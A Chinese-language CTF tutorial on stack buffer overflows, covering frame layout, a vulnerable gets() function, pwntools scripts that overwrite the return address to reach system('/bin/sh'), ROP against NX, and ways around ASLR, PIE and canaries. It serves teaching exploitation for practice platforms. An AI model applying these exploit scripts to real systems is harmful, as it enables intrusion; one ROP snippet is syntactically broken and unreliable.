+++
title = "栈溢出"
description = "二进制栈溢出漏洞原理与利用技术。"
date = 2026-06-21T06:00:00.000Z
+++

## 栈溢出

栈溢出是最经典的二进制漏洞利用技术，也是 PWN 方向的入门基础。

---

### 一、栈的基础知识

#### 栈帧结构

```
高地址
┌─────────────┐
│   参数 n     │
├─────────────┤
│   返回地址   │  ← 覆盖这里
├─────────────┤
│   保存的 EBP  │
├─────────────┤
│   局部变量   │  ← 溢出从这里开始
└─────────────┘
低地址
```

#### 函数调用过程

1. 参数压栈
2. call 指令（返回地址入栈）
3. push ebp（保存旧栈帧）
4. mov ebp, esp（建立新栈帧）
5. sub esp, N（分配局部变量空间）

---

### 二、漏洞原理

```c
void vulnerable() {
    char buf[64];
    gets(buf);  // 没有长度检查！
}
```

`gets()` 不检查输入长度，可以覆盖返回地址。

---

### 三、利用步骤

#### 1. 确定溢出偏移

使用 pattern：

```python
from pwn import *

# 生成 pattern
payload = cyclic(200)

# 运行程序，获取 EIP 值
eip_value = 0x4161616c

# 计算偏移
offset = cyclic_find(eip_value)
print(f"Offset: {offset}")
```

#### 2. 覆盖返回地址

```python
from pwn import *

offset = 76
shell_addr = 0x0804863b  # system("/bin/sh") 地址

payload = b'A' * offset
payload += p32(shell_addr)

io.sendline(payload)
```

#### 3. 跳转到 shellcode 或 ROP 链

---

### 四、安全机制与绕过

#### 1. NX（No-Execute）

栈内存不可执行。

**绕过：ROP（Return Oriented Programming）**

```python
from pwn import *

# ROPgadget
rop = ROP ELF('./binary')
pop_sh = rop.search(['pop', 'ret'])[0].address

payload = b'A' * offset
payload += p32(pop_sh)
payload += p32(shell_addr)
```

#### 2. ASLR

地址空间随机化。

**绕过：**
- 信息泄露
- 暴力破解（32位）
- Partial overwrite

#### 3. PIE

程序基址随机化。

**绕过：**
- 泄露程序基址
- Partial overwrite

#### 4. Canary

栈保护金丝雀。

**绕过：**
- 信息泄露
- 覆写 canary

---

### 五、常用工具

#### pwntools

```python
from pwn import *

# 连接远程
io = remote('target.com', 9999)

# 本地调试
io = process('./binary')

# 发送 payload
io.sendline(payload)

# 接收输出
io.recvline()

# 交互模式
io.interactive()
```

#### GDB + pwndbg

```bash
# 常用命令
b *0x401000       # 断点
info registers   # 寄存器
x/20wx $esp      # 栈
vmmap            # 内存映射
```

#### ROPgadget

```bash
# 搜索 gadget
ROPgadget --binary binary
ROPgadget --binary binary --only "pop|ret"
```

---

### 六、经典例题

```python
from pwn import *

# 设置
context.arch = 'i386'
context.log_level = 'debug'

# 连接
io = process('./ret2text')

# 构造 payload
offset = 108
system_addr = 0x08048559  # system("/bin/sh") 地址

payload = b'A' * offset
payload += p32(system_addr)

# 发送
io.sendline(payload)
io.interactive()
```

---

### 七、练习平台

- [pwnable.kr](http://pwnable.kr/)
- [ROP Emporium](https://ropemporium.com/)
- [BUUCTF PWN 方向](https://buuoj.cn/)
